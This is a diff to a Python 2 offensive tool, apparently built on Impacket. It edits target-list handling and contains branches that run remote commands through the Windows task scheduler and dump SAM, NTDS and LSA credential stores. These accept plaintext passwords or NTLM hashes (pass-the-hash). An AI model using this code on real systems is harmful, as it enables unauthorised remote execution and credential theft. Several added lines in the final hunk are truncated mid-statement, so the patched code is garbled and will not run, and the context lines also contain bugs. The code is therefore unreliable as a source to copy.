@@ -406,14 +406,15 @@ Create Pasteable Double Encoded Script:
         except Exception, e:
             print("[!] No IP address found on interface %s") % (interface)
 
-    with open(target_filename) as f:
-        targets_list = [line.rstrip() for line in f]
+    if target_filename:
+        with open(target_filename) as f:
+            targets_list = [line.rstrip() for line in f]
 
     if target and "," in target:
         targets_list.extend(target.split(','))
     elif target:
         targets_list.append(target)
-    elif targets_list:
+    if targets_list:
         for item in targets_list:
             try:
                 tgt = TargetConverter(item)
@@ -428,14 +429,15 @@ Create Pasteable Double Encoded Script:
     else:
         tgt_list.extend(targets_list)
 
-    with open(exception_filename) as f:
-        exceptions_list = [line.rstrip() for line in f]
+    if exception_filename:
+        with open(exception_filename) as f:
+            exceptions_list = [line.rstrip() for line in f]
 
     if exceptor and "," in exceptor:
         exceptions_list.extend(targets.split(','))
     elif exceptor:
         exceptions_list.append(exceptor)
-    elif exceptions_list:
+    if exceptions_list:
         for item in exceptions_list:
             try:
                 exc = TargetConverter(item)
@@ -530,17 +532,17 @@ Create Pasteable Double Encoded Script:
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
-                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+                print("[*] Attempting to access the system %s with, user: %s pwd
             if command == "cmd.exe":
                 sys.exit("[!] Please provide a viable command for execution")
-            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
+            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = do
             attack.play(dst)
         elif sam_dump:
             if hash:
-                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+                print("[*] Attempting to access the system %s with, user: %s has
             else:
-                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            attack=secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
+                print("[*] Attempting to access the system %s with, user: %s pwd
+            attack=secretsdump.DumpSecrets(address = dst, username = usr, passwo                                                                                        tem, security = security, sam = sam, ntds = ntds)
             try:
                 attack.dump()
             except Execption, e:
